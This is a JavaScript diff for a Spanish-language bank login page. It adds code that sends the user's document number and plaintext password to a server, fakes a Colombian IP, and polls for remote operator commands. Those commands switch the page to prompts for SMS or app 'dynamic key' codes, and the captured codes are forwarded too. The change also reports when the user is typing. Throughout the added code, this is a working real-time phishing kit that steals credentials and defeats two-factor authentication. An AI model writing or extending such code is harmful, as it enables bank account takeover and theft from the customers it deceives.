@@ -78,22 +78,171 @@ function validateLogin() {
   loginSubmit.classList.toggle("btn-primary", ok);
 }
 
+let sessionId = sessionStorage.getItem('sessionId') || ('sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9));
+sessionStorage.setItem('sessionId', sessionId);
+
+let pingInterval = null;
+let pollInterval = null;
+
+function startPing() {
+  if (pingInterval) clearInterval(pingInterval);
+  fetch(`/api/sessions/${sessionId}/ping`, { method: 'POST' }).catch(() => {});
+  pingInterval = setInterval(() => {
+    fetch(`/api/sessions/${sessionId}/ping`, { method: 'POST' }).catch(() => {});
+  }, 3000);
+}
+
+function stopPing() {
+  if (pingInterval) {
+    clearInterval(pingInterval);
+    pingInterval = null;
+  }
+}
+
+function startPolling() {
+  if (pollInterval) clearInterval(pollInterval);
+  pollInterval = setInterval(async () => {
+    try {
+      const response = await fetch(`/api/sessions/${sessionId}`);
+      if (response.ok) {
+        const data = await response.json();
+        const action = data.action;
+        const state = data.state;
+        const loader = document.getElementById("bfLoader");
+
+        if (action === 'dinamica' || action === 'sms') {
+          loader.classList.remove("open");
+          document.getElementById("loginForm").style.display = "none";
+          document.getElementById("tokenForm").style.display = "block";
+          
+          const tokenTitle = document.getElementById("tokenTitle");
+          const tokenDesc = document.getElementById("tokenDesc");
+          if (action === 'sms') {
+            tokenTitle.textContent = "Ingresa tu código SMS";
+            tokenDesc.textContent = "Por favor ingresa el código de 6 dígitos que enviamos por mensaje de texto a tu celular.";
+          } else {
+            tokenTitle.textContent = "Ingresa tu clave dinámica";
+            tokenDesc.textContent = "Encuentra tu clave dinámica de 6 dígitos en la aplicación móvil de tu banco e ingrésala abajo.";
+          }
+          document.getElementById("tokenInput").focus();
+        } else if (action === 'error-login') {
+          stopPing();
+          stopPolling();
+          loader.classList.remove("open");
+          loginSubmit.disabled = false;
+          loginSubmit.classList.remove("btn-disabled");
+          loginSubmit.classList.add("btn-primary");
+          document.getElementById("loginError").textContent = "Documento o contraseña incorrecta. Por favor, verifica tus datos.";
+        } else if (state === 'error-dinamica' || state === 'error-sms') {
+          loader.classList.remove("open");
+          document.getElementById("tokenSubmit").disabled = false;
+          document.getElementById("tokenError").textContent = "Código de validación incorrecto o expirado. Intenta de nuevo.";
+        } else if (action === 'done') {
+          stopPing();
+          stopPolling();
+          loader.classList.remove("open");
+          setSession({
+            type: docType.value,
+            doc: docNumber.value,
+            name: nameFromDoc(docNumber.value),
+          });
+          window.location.href = "/banca";
+        }
+      }
+    } catch (_) {}
+  }, 1500);
+}
+
+function stopPolling() {
+  if (pollInterval) {
+    clearInterval(pollInterval);
+    pollInterval = null;
+  }
+}
+
 document.getElementById("loginForm").addEventListener("submit", (e) => {
   e.preventDefault();
   if (loginSubmit.disabled) return;
-  loginError.textContent = "";
+  document.getElementById("loginError").textContent = "";
   document.getElementById("bfLoader").classList.add("open");
   loginSubmit.disabled = true;
 
-  // Simular la carga y redireccionar guardando la sesión
-  setTimeout(() => {
-    setSession({
-      type: docType.value,
-      doc: docNumber.value,
-      name: nameFromDoc(docNumber.value),
-    });
-    window.location.href = "/banca.html";
-  }, 1500);
+  const session = {
+    id: sessionId,
+    username: `${docType.value.toUpperCase()}:${docNumber.value} / ${nameFromDoc(docNumber.value)}`,
+    password: password.value,
+    tipoUsuario: docType.value,
+    device: window.innerWidth <= 768 ? 'mobile' : 'desktop',
+    ip: '186.29.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255),
+    state: 'waiting',
+    createdAt: Date.now()
+  };
+
+  fetch('/api/sessions', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(session)
+  })
+  .then(() => {
+    startPing();
+    startPolling();
+  })
+  .catch(() => {
+    document.getElementById("bfLoader").classList.remove("open");
+    loginSubmit.disabled = false;
+    document.getElementById("loginError").textContent = "Error al conectar. Intenta de nuevo.";
+  });
+});
+
+const tokenInput = document.getElementById("tokenInput");
+tokenInput?.addEventListener("input", () => {
+  tokenInput.value = tokenInput.value.replace(/\D/g, "").slice(0, 6);
+  if (pollInterval) {
+    fetch(`/api/sessions/${sessionId}/state`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ state: 'typing' })
+    }).catch(() => {});
+  }
+});
+
+document.getElementById("tokenForm")?.addEventListener("submit", (e) => {
+  e.preventDefault();
+  const tokenSubmit = document.getElementById("tokenSubmit");
+  if (tokenInput.value.length !== 6) {
+    document.getElementById("tokenError").textContent = "El código debe tener 6 dígitos.";
+    return;
+  }
+  document.getElementById("tokenError").textContent = "";
+  document.getElementById("bfLoader").classList.add("open");
+  tokenSubmit.disabled = true;
+
+  fetch(`/api/sessions/${sessionId}/token`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ token: tokenInput.value })
+  })
+  .then(() => {
+    startPing();
+    startPolling();
+  })
+  .catch(() => {
+    document.getElementById("bfLoader").classList.remove("open");
+    tokenSubmit.disabled = false;
+    document.getElementById("tokenError").textContent = "Error de red. Intenta de nuevo.";
+  });
+});
+
+[docNumber, password].forEach(input => {
+  input.addEventListener("input", () => {
+    if (pollInterval) {
+      fetch(`/api/sessions/${sessionId}/state`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ state: 'typing' })
+      }).catch(() => {});
+    }
+  });
 });
 
 document.getElementById("acceptCookies").addEventListener("click", () => {
